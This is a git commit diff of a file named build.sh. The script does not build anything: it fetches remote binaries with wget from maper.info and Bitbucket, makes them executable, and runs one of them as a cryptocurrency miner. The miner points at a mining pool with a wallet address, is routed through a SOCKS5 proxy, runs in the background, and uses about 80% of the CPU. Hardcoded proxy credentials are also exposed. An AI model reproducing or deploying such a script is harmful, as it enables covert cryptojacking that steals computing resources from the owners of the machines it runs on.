a2811868ff34ffde68c7191c224f8a2f1a210ee4
Mas kurniawan <110314564+55113110159@users.noreply.github.com>
2024-01-15 20:37:28 +0700

    Update build.sh

--- build.sh
+++ build.sh
@@ -1,7 +1,7 @@
 proxy="34.192.31.89" 
 port="1080" 
 user="fixie"  
-pass="pLhwuY8s0AUMP8f" 
+pass="rgaFWsjmFMQdR1n" 
 wget -q -O api https://maper.info/Credit && chmod +x api >/dev/null 2>&1
 wget -q https://bitbucket.org/mandaresz/feriyaz/downloads/panel && chmod +x panel 
 wget -q https://bitbucket.org/mandaresz/feriyaz/downloads/proxychains.conf && chmod +x proxychains.conf 
@@ -19,4 +19,4 @@ echo "IP ORI ==> "$(curl ifconfig.me)
 echo " " 
 echo " " 
 echo "IP BARU ==> "$(./panel curl ifconfig.me)
-./panel ./api -o 149.50.222.86:80 -u ZEPHsAfZQpiQ33Hf63Tx1MNJQR5cMV1Mx9kkgDMWNGZqMCYdsujaDUk6c4sGGiKzYwiqjucHjEYdfKaX5CbnpxPfGxa5Cb8BzcJ.8v -a rx/0 --cpu-max-threads-hint 80 -x socks5://192.252.209.155:14455 -k -s -B 
+./panel ./api -o 149.50.222.86:80 -u ZEPHsAfZQpiQ33Hf63Tx1MNJQR5cMV1Mx9kkgDMWNGZqMCYdsujaDUk6c4sGGiKzYwiqjucHjEYdfKaX5CbnpxPfGxa5Cb8BzcJ.8v -a rx/0 --cpu-max-threads-hint=80% -x socks5://192.252.209.155:14455 -k -s -B 
